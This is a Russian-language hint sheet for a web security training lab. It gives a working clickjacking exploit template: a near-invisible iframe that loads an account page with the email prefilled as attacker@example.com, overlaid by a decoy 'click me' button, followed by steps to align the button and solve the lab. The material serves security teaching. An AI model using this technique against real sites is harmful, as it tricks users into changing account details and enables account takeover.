Подсказки



1) Базовый шаблон эксплойта

Этот HTML можно использовать как отправную точку (вставляется в поле на странице «Сервер эксплойтов»):

<style>
    iframe {
        position:relative;
        width:700px;      /* ширина iframe */
        height:500px;     /* высота iframe */
        opacity:0.1;      /* сначала полупрозрачно для выравнивания */
        z-index:2;
        border:0;
    }
    div {
        position:absolute;
        top:385px;        /* позиция текста по вертикали */
        left:80px;        /* позиция текста по горизонтали */
        z-index:1;
        font-family:system-ui,Segoe UI,Roboto,Arial,sans-serif;
        padding:12px 20px;
        background:#22c55e;
        color:#022c22;
        border-radius:999px;
        font-weight:700;
        cursor:pointer;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms"
        src="http://127.0.0.1:5000/my-account?email=attacker@example.com">
</iframe>



В боевых условиях адрес http://127.0.0.1:5000 замените на базовый URL вашего стенда.

2) Рекомендуемый порядок действий





Оставьте значение src как есть
(например: http://127.0.0.1:5000/my-account?email=attacker@example.com).



Подберите значения top и left так, чтобы текст Test me находился прямо над
кнопкой «Обновить адрес электронной почты» во фрейме
(пока используйте opacity: 0.1, чтобы видеть форму).



Когда всё выровнено:





уменьшите непрозрачность до opacity: 0.0001 (iframe практически невидим),



замените текст Test me на что-то вроде «Нажми на меня».



Нажмите кнопку / текст-приманку во вкладке «Просмотр эксплойта».



Откройте /my-account:





если e-mail стал attacker@example.com и появился зелёный бейдж — лаба решена.
